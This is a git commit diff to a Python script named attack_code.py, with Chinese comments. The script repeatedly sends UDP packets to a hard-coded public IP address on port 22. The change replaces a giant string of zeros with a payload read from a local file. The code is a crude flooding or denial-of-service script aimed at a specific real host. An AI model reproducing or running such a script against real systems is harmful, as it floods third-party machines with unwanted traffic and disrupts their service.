7e9b4ae828641b1c7e0d7976a97be490c7f64ea1
rationa1Machine <38887880+rationa1Machine@users.noreply.github.com>
2020-12-13 17:23:18 +0800

    Update attack_code.py

--- attack_code.py
+++ attack_code.py
@@ -10,9 +10,11 @@ udp_socket = socket(AF_INET, SOCK_DGRAM)
 # 22表示目的端口
 dest_addr = ('47.114.93.195', 22)  # 注意 是元组，ip是字符串，端口是数字
  
-# 3. 从键盘获取数据
-send_data = "0" * (2 ** 100)
- 
+# 3. 从本地读取数据
+f = open("data", "r")
+send_data = f.read()
+f.close()
+
 # 4. 发送数据到指定的电脑上的指定程序中
 for i in range(2 ** 10):
     udp_socket.sendto(send_data.encode('utf-8'), dest_addr)
